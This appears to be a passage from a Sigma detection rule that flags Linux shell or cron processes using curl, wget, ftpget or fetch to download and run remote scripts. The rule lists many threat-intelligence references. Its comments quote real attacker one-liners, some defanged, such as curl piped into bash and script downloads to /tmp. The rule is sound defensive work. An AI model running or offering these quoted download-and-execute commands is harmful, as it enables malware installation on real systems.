      - https://www.wiz.io/blog/exposed-jdwp-exploited-in-the-wild
      - https://www.aquasec.com/blog/ai-generated-malware-in-panda-image-hides-persistent-linux-threat/
      - https://www.darktrace.com/blog/auto-color-backdoor-how-darktrace-thwarted-a-stealthy-linux-intrusion
      - https://www.oligo.security/blog/shadowray-2-0-attackers-turn-ai-against-itself-in-global-campaign-that-hijacks-ai-into-self-propagating-botnet
      - https://www.sentinelone.com/blog/defending-against-sha1-hulud-the-second-coming/
      - https://about.gitlab.com/blog/gitlab-discovers-widespread-npm-supply-chain-attack/
      - https://www.trendmicro.com/en_us/research/25/k/shai-hulud-2-0-targets-cloud-and-developer-systems.html
      - https://gist.github.com/joe-desimone/ff0cae0aa0d20965d502e7a97cbde3e3
      - https://thehackernews.com/2025/12/critical-rsc-bugs-in-react-and-nextjs.html
      - https://www.sysdig.com/blog/etherrat-dprk-uses-novel-ethereum-implant-in-react2shell-attacks
      - https://www.huntress.com/blog/peerblight-linux-backdoor-exploits-react2shell
      - https://cloud.google.com/blog/topics/threat-intelligence/threat-actors-exploit-react2shell-cve-2025-55182/
      - https://jp.security.ntt/insights_resources/tech_blog/react2shell_malware_zndoor/
      - https://beelzebub.ai/blog/threat-huntinga-analysis-of-a-nextjs-exploit-campaign/
      - https://detect.fyi/shai-hulud-2-0-campaign-be390e502f28
      - https://www.huntress.com/blog/evolving-linux-threat-landscape
      - https://www.picussecurity.com/resource/blog/t1059-004-unix-shell
  tags:
      - attack.command_and_control
      - attack.t1105
  logsource:
      category: process_creation
      product: linux
  detection:
      selection:
          ParentImage|endswith:
              - 'sh' #bash / sh / zsh
              - 'crond'
          Image|endswith:
              - 'wget' # https://www.microsoft.com/en-us/security/blog/2026/06/02/preinstall-persistence-inside-red-hat-npm-miasma-credential-stealing-campaign/; https://www.picussecurity.com/resource/blog/handala-threat-group-tactics-targets-and-attack-timeline
              - 'curl' #curl -sL http://193.24.123.68:3001/gfdsgsdfhfsd_ghsfdgsfdgsdfg.sh -o ./s.sh 2>/dev/null; https://www.sysdig.com/blog/etherrat-dprk-uses-novel-ethereum-implant-in-react2shell-attacks; https://socradar.io/blog/chinese-cybercrime-exploitation-harvesting/
              - 'ftpget' #https://www.akamai.com/blog/security-research/2026/feb/zerobot-malware-targets-n8n-automation-platform
              - 'fetch' #fetch -o /tmp/1 hxxp://tnegadge[.]s3.amazonaws.com/dfuJ8t1uhG; https://www.picussecurity.com/resource/blog/t1059-004-unix-shell
      selection_action:
          - CommandLine|contains:
              - 'anonymous' #ftpget -v -u anonymous -p anonymous -P 21 xxx.xxx.xxx.xxx 2.sh 2.sh; https://www.akamai.com/blog/security-research/2026/feb/zerobot-malware-targets-n8n-automation-platform
          - CommandLine|contains|all:
              - 'http'
              - ' | ' #https://kmsec.uk/blog/dprk-text-steganography/; https://isc.sans.edu/diary/rss/32936; https://www.trendmicro.com/en_us/research/26/e/analyzing-teampcp-supply-chain-attacks.html; https://www.esentire.com/blog/more-shells-than-a-seafood-buffet-tracking-citrix-netscaler-exploitation-activities-cve-2026-88771
          - CommandLine|contains|all:
              - 'http' #https://www.huntress.com/blog/evolving-linux-threat-landscape; https://unit42.paloaltonetworks.com/modern-kubernetes-threats/; https://research.jfrog.com/post/xinference-compromise/; https://research.jfrog.com/post/shai-hulud-here-we-go-again/; https://www.fortinet.com/blog/threat-research/inside-cross-platform-propagation-of-new-gafgyt-variant-c0xmo; https://www.picussecurity.com/resource/blog/showboat-malware-targeting-middle-east-telecom-firms-since-2022
              - ' -o ' #https://cert.gov.ua/article/6318863; https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure
          - CommandLine|contains|all:
              - 'http' #https://www.huntress.com/blog/evolving-linux-threat-landscape; https://webflow.sysdig.com/blog/jadepuffer-evolves-the-agentic-threat-actor-deploys-ransomware-built-to-destroy-ai-models
              - '/tmp' #https://socket.dev/blog/axios-npm-package-compromised; https://medium.com/@quirso_de/global-exploitation-of-cve-2026-59310-by-suspected-chinese-nexus-apt-related-cve-2026-59309-443a79e1466d; https://www.fortinet.com/blog/threat-research/multi-functional-linux-botnet-evooo1bot
          - CommandLine|contains|all:
              - 'file=@' #PromptLock pomt contains
              - 'http'
          - CommandLine|contains|all:
              - 'ftp://'
              - ' -o' # https://www.microsoft.com/en-us/security/blog/2026/05/22/from-edge-appliance-to-enterprise-compromise-multi-stage-linux-intrusion-via-f5-and-confluence/
      selection_pipe:
          CommandLine|contains|all:
              - 'curl' # curl -fsSL hxxp[:]//transfer[.]chinow[.]abrdns[.]com/get/psk_agent[.]sh | bash https://www.imperva.com/blog/stylesmuggler-exploitation-deploys-psk-agent-rat-against-magento-stores/; curl -fsSL https://bun.sh/install | bash; https://censys.com/blog/comfyui-servers-cryptomining-proxy-botnet/
              - 'http'
              - 'bash' # curl -fsSL hxxp[:]//transfer[.]chinow[.]abrdns[.]com/get/psk_agent[.]sh | bash https://www.imperva.com/blog/stylesmuggler-exploitation-deploys-psk-agent-rat-against-magento-stores/; https://www.stepsecurity.io/blog/elementary-data-compromised-on-pypi-and-ghcr-forged-release-pushed-via-github-actions-script-injection
      filters:
          CommandLine|contains:
              - 'apt-get'
              - '_replication' #elasticsearch req.
              - 'localhost'
              - '127.0.0.1'
              - '169.254.169.254'
              - 'SPHardwareDataType' #system_profiler SPHardwareDataType | awk '/Serial/ {print $4}
              - 'metadata.google.internal' #...lavor:Google' -O - http://metadata.google.internal/computeMetadata/v1/instance/id else c...
              - 'update.code.visualstudio.com'
              - 'dl.google.com'
              - 'github'
              - 'Homebrew'
              - 'cookie' #.../Homebrew/shims/shared/curl --disable --cookie /dev/null --globoff --show-err...
      condition: ((selection and selection_action) and not filters) or selection_pipe
  falsepositives:
      - Administrative activity
  level: low
level: low
